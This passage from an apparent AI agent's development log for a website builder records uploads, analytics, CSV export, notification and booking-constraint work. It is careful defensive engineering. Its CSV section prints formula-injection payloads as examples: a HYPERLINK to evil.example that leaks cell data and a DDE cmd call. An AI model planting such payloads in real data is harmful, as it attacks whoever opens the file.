+direction, and it is the second time this test has had a false green.
+
+Replaced the proximity rule with the actual signal: two dispatches are one decision only when the
+lines between them are still mid-expression (ending in `?`, `:`, `||`, `&&`, `,`, `(`). Verified by
+wedging the backdoor in three different positions — all three now caught — and the video/image/audio
+cluster still reads as gated. Added a **self-test** that does the wedge in-process, so the hole
+cannot reopen silently; reverting to the old rule turns the suite red.
+
+Unit suite **395**.
+
+### The build smoke test was flaky by construction
+
+It went red on the merge and the failure was `409 {"error":"that name is taken"}` — nothing to do
+with the change. The smoke test posts a fixed brief ("A small barber shop site…") and let the
+**designer** name the site, so it kept proposing the same good slug. A slug is claimed by whoever
+built it first **across every account**, and one of the manual test builds from earlier today
+already owned `sharp-fade-barbershop`. The build was right to refuse; the test was wrong to assume.
+
+Left alone this only gets worse: as real users claim good names, a smoke test that lets a model pick
+one will 409 at random forever. It now sends an explicit `smoke-<timestamp>-<random>` slug and
+asserts it got that slug back. A test must not depend on a global namespace it does not control.
+
+**Note for the owner:** there are seven test sites on the `livecheck-0728@isibi.ai` account —
+`bella-forno-pizzeria`, `homeplate-club`, `recipe-club`, `recipe-vault`, `sharp-fade-barbershop`,
+`velvet-static`, `wick-and-willow`. Each is a real Neon database and holds the slug. `recipe-club`
+has real member accounts on it from the auth testing. Left in place rather than deleted — say the
+word and they go through `DELETE /api/site/<slug>`.
+
+### A build that falls back now says WHY
+
+The smoke test's next run got past the slug collision and built a real site — then went red on
+`the generated app was published, not the fallback  -> page=placeholder`, with no way to tell what
+had happened. Two separate problems, and the second is the one that matters:
+
+1. The failure line put the model's own `notes` (hundreds of characters of prose) before the fields
+   that explain the failure, so `problems` was cut off by the truncation. Reordered: stage, error,
+   problems, then notes clipped to 120.
+2. **The response never carried `stage` or `error` at all.** `publish-pages.mjs` has returned both
+   since it was extracted — that was one of the two deliberate improvements over the inline original
+   — and `worker.js` was dropping them on the floor. So a build that published the placeholder said
+   only "placeholder": no way to distinguish a compile error from a lint refusal from the credit
+   floor, for the smoke test or for the person who just paid for the build. Now passed through
+   (only when it did NOT publish the app; it is the owner's own build, so there is nothing here they
+   should not see).
+
+**Answered: it was generator variance, not a regression.** The very next smoke run went
+**45/45**, `page=app`, on a real published site — React mounted, shadcn controls rendering, Tailwind
+applied, seeded content on the page, the form submitted and written to the database, every data read
+allowed and not one 403. A page that fails typecheck or lint gets one repair pass and then falls back
+by design; that is what `page: "app" | "placeholder"` exists to make visible, and it did. The
+instrumentation stays, because next time the answer should not need a second run to find.
+
+### The whole day, confirmed end to end
+
+The 45/45 smoke run is the useful summary of everything merged today, because it exercises all of it
+against the deployed Worker in one pass: a brief becomes a schema, a Neon database, seeded content,
+generated pages, a compiled bundle and a published site — and then a real browser loads that site,
+submits its form, and the row lands in Postgres. Then the owner deletes the site and the files are
+actually gone.
+
+Five PRs: #828 rate limits + the stored brief, #829 the owner's write door and the panel wired to
+it, #830 constraints as answers instead of 500s plus the auth-invariant hole, #831 the smoke test
+naming its own site, #832 saying why a build fell back. Unit suite 323 -> 395, every new test
+mutation-checked.
+
+---
+
+## 2026-07-28 — the traffic panel, which was broken twice over
+
+`site_hits` has been written on every visit since the D1 era — hashed IP, bots skipped, fired through
+`ctx.waitUntil` so serving is never slowed. **64 real hits across 20 slugs, and nothing had ever read
+a single one.** The route the panel calls did not exist.
+
+The interesting part is what I found when I went to write it. A `site_analytics` RPC was already
+there and already returned exactly the shape the panel wants — but its ownership check was:
+
+```sql
+select exists(select 1 from published_sites where slug = p_slug and user_id = auth.uid())
+```
+
+`published_sites` is the **old D1-era table**. The current builder records sites in `site_backends`.
+They share **zero rows**. So even if the route had existed, every call would have returned
+`{ok:false}` and the panel would have shown "Couldn't load analytics just now" over real data.
+
+Rather than repoint that check, the ownership decision moved **out of SQL and into the Worker**,
+where `site-owner.mjs` already does it — fails closed on an unreadable record, 404 rather than 403 so
+the slug space stays unenumerable, and tested. One ownership mechanism instead of two that can
+disagree. Which also made the function **service_role-only**, closing the advisor finding that it was
+`anon`-executable (safe until now only because its own check happened to refuse everyone).
+
+`assertOwner` is split out of `openSite` because analytics needs the gate but **not** a Neon
+connection — the numbers are in Supabase, and resolving one would be a round trip spent on nothing.
+The aggregation stays an RPC: count-distinct and a seven-day `generate_series` are not things a REST
+filter can express.
+
+One judgement worth recording: **a failed read is a 503, never zeros.** "Nobody visited your site" is
+a very different and much worse thing to tell someone than "try again in a moment". A site that
+genuinely has no visits still reads as zeros and an empty week, so a new site does not look broken.
+
+Verified against the live database before wiring: `sharp-fade-barbershop` → 4 views, 4 visitors,
+seven-day series ending `Jul 28: 4`. anon and authenticated can no longer execute the function.
+
+Unit suite **403**, 10/10 mutations on the analytics handler.
+
+---
+
+## 2026-07-28 — pictures, which nothing could store
+
+Same shape as the analytics gap, and I only found it by looking: **`/u/<slug>/<file>` has served
+uploads from R2 since the D1 era — public, immutable-cached, `nosniff` — and nothing has ever written
+one.** The read half survived the 2026-07-27 runtime deletion; the write half did not. So a café's
+menu, a barber's gallery and a shop's products were all text, on every site the builder has ever made.
+
+`POST` / `GET /api/site/<slug>/uploads` and `DELETE /api/site/<slug>/uploads/<file>`, behind the same
+`assertOwner` gate as rows and analytics.
+
+### The decisions worth keeping
+
+- **Stored at `uploads/<slug>/`, not `sites/<slug>/`.** That second prefix is wiped on every publish
+  by `deleteSitePrefix`. A revise must not delete the owner's photographs.
+- **The filename is a hash of the CONTENT.** Three things fall out and all of them matter: a caller
+  cannot choose a path, so traversal and cross-site overwrite are closed *by construction* rather
+  than by escaping; re-uploading the same picture is free and idempotent instead of a second copy;
+  and `/u/` serving `immutable` is actually true, because the name *is* the bytes.
+- **SVG is refused.** `/u/` serves `content-disposition: inline` from isibi.ai, and an SVG is a
+  document that can carry `<script>` — that is stored XSS on our own origin, and `nosniff` does not
+  help because the type would be honestly declared as `image/svg+xml`. There is no safe way to serve
+  visitor-supplied SVG from this origin without a separate domain, so it is refused outright rather
+  than half-mitigated. PNG/JPEG/WebP/GIF, decided by **leading bytes** — never the declared
+  Content-Type, which the caller writes.
+- Caps: 5 MB a file, 200 files and 100 MB a site. A re-upload counts against neither, because
+  refusing it would be refusing to do nothing.
+
+### Three bugs found before shipping, two of them mine
+
+1. **A degenerate hash would have created an undeletable object.** `handleUploadDelete` only accepts
+   the shape we mint, so a name that did not clean to 32 hex characters could go INTO the bucket and
+   never be addressable again — permanent garbage from our own wiring mistake. Now refused.
+2. **The Worker was hashing the wrong thing.** I wired `hash` to the existing `sha256hex`, which
+   takes a *string*: `TextEncoder().encode(uint8array)` turns `[0x89,0x50,0x4e,0x47]` into the text
+   `"137,80,78,71"`. Deterministic by luck, so dedup would still have worked, but it would have
+   stringified a 5 MB photo into ~20 MB before hashing it. Digests the bytes directly now.
+3. **Four mutants survived the first run, three on the delete path** — the traversal test, the
+   extension test and the gate test all passed just as happily with the check torn out, because the
+   files they used were not in the listing and so 404'd for the wrong reason. Rewritten so the
+   listing really contains each traversal target: now the ONLY thing that can refuse is the name
+   check. 23/23.
+
+Frontend: image-ish columns in the Data panel's edit form get a thumbnail and an Upload button.
+`isImageCol` is a naming guess, and deliberately a cheap one — the column is plain text either way,
+so a wrong guess costs a button that is not offered, never a broken save.
+
+Generator: rule 7 says a picture column holds a URL, render a bare `<img>`, never an upload control
+(there is no visitor upload route), and **always guard it** — the owner fills these in after the
+build, so on a fresh site the value is empty and `<img src="">` is a broken image on every card.
+
+**Still not built: visitor upload.** A public endpoint that accepts arbitrary bytes and serves them
+from our origin needs its own thinking about quota and abuse; it is not a line of code away from
+this one.
+
+Unit suite **431**.
+
+### Verified live, and one stale doc found on the way
+
+Uploads, against the deployed Worker and the real bucket: **19/19**. The ones that matter went end to
+end — an SVG declared as `image/svg+xml` is refused, HTML wearing an `image/png` header is refused,
+the served type is the SNIFFED one, a traversal filename could not touch the published site (and the
+site was still up afterwards), the same picture twice de-duplicated, and the bytes came back byte-for-
+byte identical.
+
+Taking the screenshot turned up something else: **CLAUDE.md still described the app as "dark studio
+design … near-black #08070c"**. `styles.css` has said the opposite since 2026-07-23 — "Black-and-white
+platform (owner): high-contrast light, white surfaces, near-black ink" — so the doc was five days
+stale on the single most visible fact about the product, and my first render came out dark-on-dark
+because of it. Fixed, and pointed at `styles.css` as the authority so the next drift is obvious.
+
+---
+
+## 2026-07-28 — getting the data out, and the bug hiding in a CSV
+
+The Backups panel has had a working download button since the D1 era, wired to
+`/api/site/backend/export` — deleted 2026-07-27. So a barber shop's bookings could be read on screen
+and never got out of the building. `GET /api/site/<slug>/export?table=<t>&format=csv|json`, same gate
+as everything else.
+
+**The interesting part of a CSV export is not the commas.**
+
+A `collect` table is, by definition, text a stranger typed into a form. Excel, LibreOffice and Google
+Sheets all treat a cell beginning `=`, `+`, `-` or `@` as a **formula** and evaluate it on open. So a
+booking whose notes read
+
+```
+=HYPERLINK("https://evil.example/?"&A1,"Click for your receipt")
+```
+
+builds a live link out of the neighbouring cell the moment the owner opens the file — and
+`=cmd|'/c calc'!A1` is worse. The person attacked is the **owner**, by their own spreadsheet, using
+data our own API handed them.
+
+**Quoting does not fix this.** The CSV parser strips the quotes before the formula parser ever sees
+the cell. The value has to stop being a formula, so it is prefixed with `'`, which those programs
+read as "this is text".
+
+`-` is handled narrowly and deliberately: it is a real trigger (`-1+1` evaluates) but it is also how
+every negative number and plenty of dates begin. Blanket-prefixing would corrupt ordinary data in the
+common case to defend against the rare one — so a value that is simply a number is left alone, and
+anything else that starts dangerously is neutralised. Both halves are tested.
+
+Two smaller calls: the column list is `id`, `created_at`, the declared columns, **and then anything
+the rows really have that the schema never named** — an export that silently drops a column is not a
+backup. And `attachment`, never `inline`: owner-supplied text must not render as a document on our
+own origin.
+
+One of my own test expectations was wrong again and worth noting, because it is the same shape as
+last time: I asserted that a mid-value `\r` would be neutralised. It should not be — a control
+character only triggers the formula guard when it LEADS. The code was right; the test was wrong.
+
+Unit suite **454**, 24/24 mutations on the export.
+
+---
+
+## 2026-07-28 — somebody had to tell the owner
+
+The biggest hole left in the product, as opposed to the plumbing: **a barber shop took a booking and
+nobody told them.** The only way to find out was to log into isibi and look at the Data panel — a
+fine place to review bookings, a terrible way to learn one exists.
+
+A `collect` insert now emails the site owner, through the Go Farther mailer that already sends
+password resets.
+
+### The three things that made it more than "send an email"
+
+1. **It must never slow the visitor down, or break their booking.** The submit has already succeeded
+   by the time any of this runs. Detached through `ctx.waitUntil`, and every failure path inside
+   returns a *reason* rather than throwing — with the reason logged, because detached code that
+   throws just vanishes.
+2. **It must not be weaponisable.** A form is a public endpoint. "Every POST emails the owner" is a
+   mail bomb aimed at our own customer with a trigger anyone on the internet can pull. So there is a
+   five-minute cooldown — and it is claimed **in the database**, not in an isolate: Cloudflare runs
+   many isolates per colo, and a per-isolate memory would happily send one email from each of them.
+   One conditional `PATCH … WHERE notify AND notified_at < cutoff RETURNING` means exactly one caller
+   wins a window.
+3. **The submission is attacker-controlled text going into an HTML email.** Same class as the CSV
+   injection from earlier today, same discipline. Keys and values escaped, internal columns dropped,
+   twelve fields maximum, values clipped.
+
+And an off switch — `POST /api/site/<slug>/notify {on}`, with a toggle in the Data panel header.
+Unsolicited email with no way to stop it is not something to ship. It defaults ON, because a booking
+form nobody is told about is the bug this is fixing.
+
+### A test that would never have fired
+
+A mutation run caught one of mine: I asserted that `_fts` and `owner_id` do not appear in the email,
+but the key is rendered through `replace(/_/g, " ")` — so `_fts` displays as " fts" and the literal
+string I was looking for could never have been there. Re-asserted on distinctive *values* and on the
+row count instead. 21/21.
+
+Unit suite **474**.
+
+---
+
+## 2026-07-28 — a visitor can attach a photo, on a short leash
+
+The last real gap in what a generated site can *be*. A customer booking a haircut has no account, so
+this endpoint is unauthenticated for the same reason the rest of `/api/db` is — which makes it a
+**public endpoint that accepts arbitrary bytes and serves them back from isibi.ai**. That is the
+whole design problem; the upload itself is the easy part.
+
+### What stops it being free image hosting
+
+The answer to "may I upload?" is deliberately narrow: **the table must be one a visitor can write to,
+AND it must declare an image column.** A barber shop whose booking form is six text fields accepts
+nothing at all — which is the answer for the large majority of sites. Asking anyway gets a 403 that
+says the form doesn't take files.
+
+Both halves are load-bearing and both are mutation-tested: dropping either one turns this into an
+endpoint anyone who knows a slug can store pictures on.
+
+### The rest of the leash
+
+- **2 MB a file**, against the owner's 5 — a phone photo, not a print master.
+- **5 uploads a minute per IP per site**, checked *before* the bytes are hashed or the bucket is
+  listed. A flood should cost us as close to nothing as possible, and this is the one endpoint a
+  stranger can call.
+- **A visitor allowance of 50 files / 25 MB, counted only against files marked `visitor`.** Sharing
+  the site budget would mean a flood could crowd the owner out of their own storage; a stranger can
+  exhaust their allowance and the owner's pictures are untouched.
+
+That last one has a trap in it worth writing down: **R2 only returns `customMetadata` on a list if
+you ask for it** (`include: ["customMetadata"]`). Without that, every visitor upload looks like one
+of the owner's, the allowance counts nothing, and the protection quietly does not exist.
+
+### The client half
+
+`uploadFile` / `useUploadFile` in `@/lib/rows`: upload, get a URL, put it in the form as an ordinary
+text field, submit the row as normal. **The row write stays plain JSON** — no multipart, no file
+field — and generator rule 8 says so, because a model reaching for multipart would produce a form
+that 400s. There is a drift test asserting the export the rule names really exists in the template,
+and the template still typechecks and builds (18/18).
+
+Unit suite **488**, 17/17 mutations on the visitor path.
+
+### And a feature that could never have fired
+
+Verifying it live turned up the thing that mattered. Every one of the seven generated sites has image
+columns — `image_url`, `photo_url`, `cover` — and **every single one is on a `display` table.** Not
+one `collect` or member table has one, anywhere.
+
+Which means visitor upload, which requires exactly that, would have been refused on every site that
+exists. The gate was working perfectly and the feature was unreachable.
+
+That is a schema-designer problem, not an upload problem: the model puts pictures where the site
+SHOWS them and never where a visitor SENDS them, because nothing ever told it the difference matters.
+The `columns` schema now says a picture is a text column holding a URL, that a `display` one is
+content the owner fills in after the build, and that a `collect` or member one goes in **only when
+the brief says the visitor sends a picture** — which is what makes the form able to accept a file at
+all. There is a test that reads worker.js and fails if that guidance goes away.
+
+### Proved live, and for free
+
+The build route takes an explicit `schema`, which skips the model **and** the credit charge — so
+adding a `photo` column to the barber shop's booking form to test this cost **0 credits** (balance
+278 before and after). Then, as an anonymous caller with no account:
+
+```
+ok   accepted, with NO account
+ok   and it is served publicly
+ok   as the sniffed type
+ok   byte-for-byte
+ok   the booking is created carrying the photo URL
+ok   services (display) still refuses
+ok   a burst gets throttled
+```
+
+One test of mine failed on the way and was worth having: I left `service` out of the booking, and the
+API answered **`"service is required"` with the field named** — this morning's constraint mapping
+doing its job on a path I had not thought to point it at.
+
+**Note:** `sharp-fade-barbershop`'s `bookings` table now has a `photo` column and a couple of live-
+check rows, from this verification.
+
+---
+
+## 2026-07-28 — every booking site you have ever generated could be double-booked
+
+Went looking for what was next and found this. On the live generated barber shop:
+
+```
+two customers booking the SAME slot: 201 201
+  → BOTH ACCEPTED — the barber is double-booked
+```
+
+### It was never a missing feature
+
+The schema engine has `unique` (composite, race-free, a real index — and it supports a PARTIAL form
+so a *cancelled* booking stops holding the slot) and `noOverlap` (a genuine `EXCLUDE USING gist`
+constraint for variable-length appointments). Both fully implemented. Both have been there since the
+engine was written.
+
+**The schema designer could emit exactly five things:** `name`, `access`, `columns`, `timestamps`,
+`fts`. That is the whole tool. So `unique`, `uniqueCI`, `maxRows` and `noOverlap` were built, tested,
+and unreachable — no site the builder has ever produced has a single constraint on it.
+
+Now the tool offers those four, with the booking case named in the guidance rather than left to
+inference, and with `noOverlap`'s trap spelled out: it **requires integer start/end columns and is
+silently skipped otherwise**, so the guidance says to use plain `unique` unless the integers were
+actually declared.
+
+Proved live on the barber shop, again for 0 credits via the explicit-schema path — and clearing the
+duplicate rows first used the owner-delete route shipped this morning:
+
+```
+first  -> 201
+second -> 409 {"error":"that already exists","code":"duplicate"}
+  ✓ the slot is taken — double booking refused
+a DIFFERENT slot still works -> 201
+```
+
+### What the survey turned up, which matters more than the fix
+
+A whole tier of schema features is **parsed, validated, persisted to `_meta`, and acted on by
+nothing**: `publicView`, `teamRead`, `transitions`, `sla`, `mask`, `fieldRoles`, `webhooks`, `geo`,
+`currency`, `formulas`, `roundRobin`, `assignBy`, `searchWeights`, `jsonShapes`, `checks`, `computed`,
+`defaultSort`. Their only appearance in `applySiteSchema` is the line that copies them into `_meta`.
+`maskFields()` is written and never called.
+
+Nothing can declare them, so nothing is silently broken today — but **two documents claimed
+otherwise**, and both would have misled the next person:
+
+- `site-schema.mjs`'s own header said this is "where unique / noOverlap / publicView / teamRead /
+  transitions / sequence / sla / trash actually live". True for four of those eight.
+- CLAUDE.md said `noOverlap` was "still the hand-rolled INSERT … WHERE NOT EXISTS" and that a gist
+  exclusion was "not yet done". It has been a real `EXCLUDE USING gist` constraint for some time.
+
+Both corrected, with the verified list of what IS enforced written down next to them. The lesson,
+which cost me an hour of reading to learn: **do not assume a declared feature does anything without
+finding its DDL.**
+
+Unit suite **495**.
+
+---
+
+## 2026-07-28 — publicView, and the booking page can finally grey out a taken slot
+
+The most useful of the seventeen dead features, and the other half of the double-booking fix: #840
+stopped a duplicate booking being ACCEPTED, this stops the visitor being OFFERED it.
+
+`GET /api/db/<slug>/rows/<table>/public`. A `collect` table cannot be read — that is the point of it
+— so a booking page had no way to know which times were gone. The only alternative was making the
+table readable, which publishes every customer's name and email.
+
+It deliberately ignores the access level, which is exactly why nothing about it is inferred:
+
+- The columns are an explicit allow-list from the table's own declaration, and the parser already
+  refuses `id` and `owner_id`. No wildcard.
+- A caller may filter, but ONLY on the published columns. Otherwise filtering on `customer_email` and
+  watching the row count answers "does this person have a booking?".
+- The declared `where` is ANDed on, so a site publishing only confirmed bookings cannot be made to
+  surface a cancelled one.
+
+Live on the barber shop, as a stranger with no account:
+
+```
+ok   the public view is readable with no account
+ok   it shows WHEN people booked
+ok   and NOTHING about who
+     2030-06-15 14:30 · 2030-01-01 10:00 · 2031-03-03 14:00 · 2032-04-04 11:00
+ok   a direct read of the table is still 403
+```
+
+### Two things the live run taught me, both about my own testing
+
+**The 15s schema cache is long enough to fail a test.** The first run declared the publicView and read
+it two seconds later — and got the schema from *before* the declaration, because `applySiteSchema`
+only clears the cache in the isolate that ran the build and every other PoP heals by expiry. That is
+the documented, deliberate tradeoff, not a bug; but it means **a revise takes up to 15 seconds to
+become visible**, which is worth knowing before someone reports it as one.
+
+**Two of that run's "passes" were vacuous.** "Filtering on an unpublished column is ignored" compared
+row counts — and 0 equals 0, so it passed while everything was 404ing. Same for "filtering on a
+published column works", which used `.every()` on an empty array. Both now require rows, and the
+narrowing one requires *strictly fewer* rows than the unfiltered read.
+
+Unit suite **508**.
+
+---
+
+## 2026-07-28 — sharing a generated site showed a bare URL
+
+Checked what a published site's `<head>` actually contains before picking the next job, and it is
+six lines: charset, viewport, favicon, title, script, stylesheet. **No description. No Open Graph.**
+And `<div id="root">` is empty until JavaScript runs.
+
+Google runs JavaScript, so a site gets indexed eventually. **Link previews do not.** WhatsApp,
+iMessage, Slack, Facebook and LinkedIn each fetch the HTML once, read the head, and render whatever
+is there. So a barber shop sending customers their own link got a bare URL with no name, no
+description and no picture — on every site the builder has ever published. For a small business that
+link *is* the marketing.
+
+`injectMeta` at publish time, inside `writeSiteDistToR2` and **gated on `index.html`** — rewriting a
+bundle or a stylesheet would corrupt the dist silently. The head belongs to the built dist, which the
+model never sees, so this is the only place it can happen.
+
+The care went into making it unable to do harm:
+
+- **Idempotent by construction.** The block is fenced in `<!--isibi:meta-->` comments and replaced, so
+  republishing fifty times leaves one copy — and a renamed shop does not keep its old name alongside
+  the new one.
+- **Escaped into attributes.** Brand and description are model-written and go straight inside
+  `content="…"`.
+- **Whitespace collapsed**, because a newline inside an attribute is a broken tag.
+- **Capped** at 70 and 200 characters — a preview truncates anyway, and a 900-character description
+  in a head is just weight.
+- **The card type follows the picture**: `summary_large_image` with no image renders an empty box.
+- **It can only ever no-op.** No head, no meta, unparseable input → the html comes back unchanged. A
+  site published without a description is a far smaller problem than one published broken.
+
+`description` is now a required field on the schema designer — one sentence written for a customer,
+not a developer. A revise sends no brief, so the fallback chain is designed → body → the stored
+`brief` → the instruction. The og:image is the owner's first upload if there is one.
+
+One real bug found by my own test: `metaTags(null)` threw, because `= {}` defaults only `undefined`
+and a caller with nothing to say passes `null` far more naturally than it omits the argument.
+
+And one mutation that survived and shouldn't have: removing the else branch emitted **two**
+contradictory `twitter:card` tags, and my assertion only checked the right one was present. Now it
+asserts exactly one. 14/14.
+
+Unit suite **520**.
+
+---
+
+## 2026-07-28 — I broke the builder's main path for three merges
+
+`build smoke` had been failing since #840 and I did not look, because it runs *after* the deploy and
+therefore lags — so I merged #841 and #842 on top of a red run without noticing. That is on me.
+
+The failure was `503 {"msg":"The designer is busy — try again in a moment."}` on **every build with a
+brief**. Reproduced live: the core feature of the site builder was down in production.
+
+### The cause
+
+When I exposed the constraints to the schema designer, I wrote:
+
+```js
+unique: { type: "array", description: "…", items: {} }
+```
+
+`items: {}` was meant to allow both shapes the parser accepts — `[["a","b"]]` and
+`[{columns, where}]`. **The Anthropic API rejected the whole tool for it**, so `designSiteSchema`
+threw, and the route's catch turned that into "the designer is busy".
+
+Now one consistent object shape (`{columns, where?}`), which the parser already accepts.
+
+The charge-then-refund path worked exactly as designed throughout — balance 278 before, 278 after a
+failed build — so nobody was billed for it. That is the one thing this episode got right by itself.
+
+### What made it possible, and what now prevents it
+
+Nothing in the unit suite looked at the *shape* of a tool definition. The only thing that could catch
+it was the smoke test, which runs post-deploy and lagged three PRs behind.
+
+`test/api-auth.test.mjs` now walks every tool's `input_schema` structurally: an array needs non-empty
+`items`, an object needs `properties`, everything needs a `type`. Verified by re-introducing
+`items: {}` — the suite goes red.
+
+It immediately found a second one: `direct_studio.actions.items.n` had no `type`. That tool is
+unreachable (`"studio"` is not in the step allowlist, so it is never sent) and so had never mattered
+— typed anyway rather than exempted, because a guard with an exemption list rots.
+
+**The lesson: a post-deploy check is not a gate.** If a failure mode can only be caught after
+merging, it will be caught after merging — three times, in this case.
+
+Unit suite **523**.
+
+---
+
+## 2026-07-31 — the 196 documentation examples are deleted
+
+Owner asked what the blocks and examples were actually for, after seeing all 27 blocks and all 196
+examples rendered in the chat. The answer for the examples was: nothing the builder can use.
+
+**The stated purpose was unreachable.** The lint rule's own message said "read one to see how a
+component is used, then write the real thing" — but the model has no file access. It can only
+IMPORT, and importing was precisely what the rule refused. Confirmed before deleting that neither
+`PAGE_RULES` nor `GENERATOR.md` ever mentions the folder, so the model was never told it existed.
+The whole tier served a human browsing the repo.
+
+**The lint rule went with the files, and that is the decision to re-examine if they come back.**
+It existed for one reason, stated in its own comment: every file in `src/examples/` COMPILED, so
+`tsc`, `vite` and every other check passed while the page published showing a real customer *"Our
+flagship product combines cutting-edge technology with sleek design."* Once the folder is gone that
+import is a missing module, which `tsc` catches like any other — the justification evaporated with
+the files, so guarding a path that no longer resolves would have been the dead-code-that-looks-alive
+pattern this repo keeps documenting.
+
+The honest cost: a page that writes `@/examples/…` from training-data habit now burns the single
+repair pass instead of being caught for free. Judged worth it, because the model is never pointed at
+that path in the first place.
+
+**The test asserts the PREMISE, not the removed rule.** `test/page-gen.test.mjs` now fails if
+`src/examples/` exists at all. Restoring the files without restoring the rule brings the silent
+failure straight back, and a test that merely stopped checking would say nothing about that.
+
+### What was NOT done
+
+**The 27 blocks stay.** Owner said examples only. Worth recording that they are in exactly the state
+the examples were in, and it is accidental rather than decided: nothing tells the model they exist,
+no lint rule mentions them either way, `tsconfig.json` excludes them and `tsconfig.kit.json` does
+not cover them — so they are typechecked by nothing and reachable by nothing. Rendered all 27 live:
+they compile and display, and every one is inert markup. `login-01`'s form has no `onSubmit`, its
+links are `href="#"`, its "Login with Google" button is wired to nothing, and not one block imports
+`@/lib/rows`. Open question, not a recommendation already acted on.
+
+### Found while rendering, not yet fixed
+
+**Any generated page using `Tooltip` outside a sidebar shell hard-crashes.**
+`src/components/ui/tooltip.tsx` is the older shadcn shape (`const Tooltip = TooltipPrimitive.Root`,
+no self-wrapping provider), and the only `TooltipProvider` in the template is inside `sidebar.tsx`,
+mounted by `SidebarProvider`. `__root.tsx` mounts none. `tooltip` IS in `UI_COMPONENTS`, so the
+generator is actively told to use it — and a business site renders no sidebar shell. Typechecks,
+bundles, publishes, throws on render: the `message-scroller` class again, where compiling is not
+working. Five of the examples were crashing on exactly this, which is how it surfaced. Two-line fix
+either way, awaiting the owner's call.
+
+Unit suite **589**, site-build 33/33, both template typechecks clean.
+
+---
+
+## 2026-07-31 — the 27 blocks are deleted too
+
+Same session, same call, straight after the examples. Owner saw all 27 rendered in the chat and said
+delete them.
+
+**They were rendered live first, and they all worked** — 27/27 compile and display, no console or
+page errors. So this is not a claim they were broken. What decided it is that every one is inert
+markup: `login-01`'s form has no `onSubmit`, its links are `href="#"`, its "Login with Google" button
+is wired to nothing, and **not one block imports `@/lib/rows`**. Using one means rewriting every line
+that does anything, at which point it is a reference rather than a component — and the 500-component
+kit already covers the parts (that login card is `Card` + `Label` + `Input` + `Button`, APIs we own
+and describe accurately).
+
+**They were reachable by nothing anyway.** Nothing in `PAGE_RULES` or `GENERATOR.md` mentioned the
+folder, and unlike the examples there was no lint rule in either direction — so the model was never
+told they existed and nothing stopped it if it guessed. `tsconfig.json` excluded them and
+`tsconfig.kit.json` did not cover them, so they were typechecked by nothing.
+
+The fit was wrong independently of all that: 16 of the 27 were admin sidebars and 1 an analytics
+dashboard, on a platform that makes barber shops and cafés. The 10 that could have mattered — login
+and signup — were exactly the inert ones.
+
+### Scope, after the owner narrowed it mid-change
+
+I had also deleted `builder/install-blocks.sh` on the reasoning that an installer for deleted files
+is dead. Owner said "just these blocks you showed me", so **the script is restored and kept**. It is
+the record of how they were installed and the only way to get them back, and it does nothing until
+somebody runs it. Worth noting for a future session: it is inert, not live.
+
+### One pin that OUTLIVES the blocks — do not "clean it up"
+
+A block install once silently upgraded `react-day-picker` 9 → 10 and broke `calendar.tsx` (`TS2353`,
+its `ClassNames` type changed), so it is pinned to `^9.14.0`. **`calendar.tsx` is still in the kit
+and still needs v9.** The pin is about that component, not about the blocks that caused it. Deleting
+the blocks is not a reason to unpin.
+
+Unit suite **589**, site-build 33/33, both template typechecks clean.
